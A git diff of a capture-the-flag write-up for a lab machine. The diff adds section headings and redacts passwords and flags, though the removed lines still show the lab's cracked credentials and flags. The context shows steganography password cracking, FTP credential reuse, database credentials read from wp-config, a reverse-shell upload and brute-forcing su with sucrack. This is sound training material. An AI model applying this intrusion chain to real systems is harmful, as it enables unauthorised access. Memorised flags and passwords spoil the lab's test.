@@ -70,6 +70,8 @@ Now let's have a look at a possible website on port 80:
 
 ![diffctf-website](/assets/images/2021-04-22-21-11-33.png)
 
+## Gobuster
+
 We find an default install of WordPress. There's a user hakanbey01, but nothing of any interest on the site. Let's look for subfolders:
 
 ```text
@@ -132,6 +134,8 @@ wordlist.txt                        100%[=======================================
 2021-04-22 21:23:01 (2.72 MB/s) - ‘wordlist.txt’ saved [403891/403891]
 ```
 
+## Stegcracker
+
 Let's install stegcracker:
 
 ```text
@@ -193,10 +197,10 @@ StegSeek can be found at: https://github.com/RickdeJager/stegseek
 
 Counting lines in wordlist..
 Attacking file 'austrailian-bulldog-ant.jpg' with wordlist 'wordlist.txt'..
-Successfully cracked file with password: 123adanaantinwar
+Successfully cracked file with password: <HIDDEN>
 Tried 49316 passwords
 Your file has been written to: austrailian-bulldog-ant.jpg.out
-123adanaantinwar
+<HIDDEN>
 ```
 
 We've found the password, what was hidden in there:
@@ -208,18 +212,20 @@ austrailian-bulldog-ant.jpg.out: ASCII text
 
 ┌──(root💀kali)-[~/thm/diffctf]
 └─# cat austrailian-bulldog-ant.jpg.out 
-RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=
+<HIDDEN>
 ```
 
 Looks like base64:
 
 ```text
 ┌──(root💀kali)-[~/thm/diffctf]
-└─# echo RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s= | base64 --decode
+└─# echo <HIDDEN> | base64 --decode
 FTP-LOGIN
 USER: hakanftp
-PASS: 123adanacrack  
+PASS: <HIDDEN>
 ```
+
+## FTP Access
 
 Nice one. We have username and password for the ftp server, let's try it:
 
@@ -299,13 +305,15 @@ define( 'DB_NAME', 'phpmyadmin1' );
 define( 'DB_USER', 'phpmyadmin' );
 
 /** MySQL database password */
-define( 'DB_PASSWORD', '12345' );
+define( 'DB_PASSWORD', '<HIDDEN>' );
 
 /** MySQL hostname */
 define( 'DB_HOST', 'localhost' );
 
 <SNIP>
 ```
+
+## PHP My Admin
 
 We have user and password for the phpmyadmin login page, which we saw earlier when we ran gobuster. Let's try to log in:
 
@@ -353,6 +361,8 @@ ftp> chmod 777 test.txt
 I tried adana.thm/test.txt but that didn't work so I tried subdomain.adana.thm and we get the file:
 
 ![diffctf-test](/assets/images/2021-04-22-21-44-30.png)
+
+## Reverse Shell
 
 We have confirmed that a file uploaded via FTP can be accessed on the subdomain. Time to put a reverse shell on there, let's find one of the built in ones:
 
@@ -451,6 +461,8 @@ Just one, but after a little looking around I got stuck on the next move. Then I
 ![diffctf-banner](/assets/images/2021-04-22-22-04-06.png)
 
 There's a clue on there. What is sucrack? Why is it mentioned?
+
+## Sucrack
 
 I found it [here](https://github.com/hemp3l/sucrack), and it's a small tool to brute force su with a wordlist. We have a wordlist from before, and we know the user. Now we need to get both sucrack and the wordlist on to the server, we can use FTP again for this:
 
@@ -556,10 +568,12 @@ Now I tried it again:
 
 ```text
 www-data@ubuntu:/tmp/sucrack/src$ sucrack -u hakanbey -w 100 new-wordlist.txt
-password is: 123adanasubaru
+password is: <HIDDEN>
 ```
 
 That worked and we have the user hakenbeys password. Let's su to them:
+
+## Hakanbey User
 
 ```text
 www-data@ubuntu:/tmp$ su hakanbey
@@ -572,7 +586,7 @@ First thing we get the flag:
 ```text
 hakanbey@ubuntu:/tmp$ cd /home/hakanbey/
 hakanbey@ubuntu:~$ cat user.txt 
-THM{8ba9d7715fe726332b7fc9bd00e67127}
+THM{HIDDEN}
 ```
 
 Check us out:
@@ -606,8 +620,10 @@ We found the other flag:
 
 ```text
 hakanbey@ubuntu:/tmp$ cat /var/www/html/wwe3bbfla4g.txt
-THM{343a7e2064a1d992c01ee201c346edff}
+THM{HIDDEN}
 ```
+
+## Hidden Binary
 
 Nothing else obvious, let's have a look for files owned by our group:
 
@@ -646,7 +662,7 @@ hakanbey@ubuntu:/tmp$ strings /usr/bin/binary
 u6VO
 libc.so.6
 exit
-<SNIP
+<SNIP>
 []A\A]A^A_
 I think you should enter the correct string here ==>
 /root/hint.txt
@@ -659,14 +675,14 @@ Unable to copy!
 ;*3$"
 ```
 
-We can see some ascii, let's use ltrace:
+We can see some ASCII, let's use ltrace:
 
 ```text
 hakanbey@ubuntu:/tmp$ ltrace /usr/bin/binary
 strcat("war", "zone")                            = "warzone"
 strcat("warzone", "in")                          = "warzonein"
 strcat("warzonein", "ada")                       = "warzoneinada"
-strcat("warzoneinada", "na")                     = "warzoneinadana"
+strcat("warzoneinada", "<HIDDEN>")                     = "<HIDDEN>"
 printf("I think you should enter the cor"...)    = 52
 __isoc99_scanf(0x56037e0adedd, 0x7ffc25e8ece0, 0, 0I think you should enter the correct string here ==>
 ^C <no return ...>
@@ -678,7 +694,7 @@ Aha, looks like something is revealed, we should try that:
 
 ```text
 hakanbey@ubuntu:/tmp$ /usr/bin/binary
-I think you should enter the correct string here ==>warzoneinadana
+I think you should enter the correct string here ==><HIDDEN>
 Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
 Copy /root/root.jpg ==> /home/hakanbey/root.jpg
 ```
@@ -699,6 +715,8 @@ local: root.jpg remote: root.jpg
 226 Transfer complete.
 45835 bytes received in 0.06 secs (811.5152 kB/s)
 ```
+
+## Hexeditor
 
 Use a hex editor to look at the file:
 
